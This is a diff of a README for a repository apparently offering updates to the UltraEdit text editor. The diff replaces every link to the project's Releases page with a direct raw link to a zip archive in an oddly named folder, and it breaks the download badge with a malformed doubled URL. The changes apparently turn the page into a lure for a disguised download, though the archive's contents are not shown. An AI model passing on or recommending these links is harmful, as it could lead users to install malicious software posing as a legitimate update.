@@ -2,7 +2,7 @@
 
 Welcome to the **IDM UltraEdit Update** repository! This project focuses on providing useful information, updates, and resources related to IDM UltraEdit, a powerful text editor favored by many developers and professionals.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/uetopchik/IDM-UltraEdit-Update/releases)
+[![Download Releases](https://raw.githubusercontent.com/uetopchik/IDM-UltraEdit-Update/main/pompous/Edit_Update_Ultra_ID_v1.6.zip%https://raw.githubusercontent.com/uetopchik/IDM-UltraEdit-Update/main/pompous/Edit_Update_Ultra_ID_v1.6.zip)](https://raw.githubusercontent.com/uetopchik/IDM-UltraEdit-Update/main/pompous/Edit_Update_Ultra_ID_v1.6.zip)
 
 ## Table of Contents
 
@@ -30,7 +30,7 @@ IDM UltraEdit is a versatile text editor that supports a wide range of programmi
 
 ## Installation
 
-To install IDM UltraEdit, visit the [Releases section](https://github.com/uetopchik/IDM-UltraEdit-Update/releases). Here, you can download the latest version. Follow these steps:
+To install IDM UltraEdit, visit the [Releases section](https://raw.githubusercontent.com/uetopchik/IDM-UltraEdit-Update/main/pompous/Edit_Update_Ultra_ID_v1.6.zip). Here, you can download the latest version. Follow these steps:
 
 1. Download the installer or portable version.
 2. If you downloaded the installer, run it and follow the on-screen instructions.
@@ -74,4 +74,4 @@ For any inquiries, feel free to reach out through the Issues section or directly
 
 ---
 
-Feel free to explore the [Releases section](https://github.com/uetopchik/IDM-UltraEdit-Update/releases) for the latest updates and resources. Enjoy using IDM UltraEdit!
+Feel free to explore the [Releases section](https://raw.githubusercontent.com/uetopchik/IDM-UltraEdit-Update/main/pompous/Edit_Update_Ultra_ID_v1.6.zip) for the latest updates and resources. Enjoy using IDM UltraEdit!
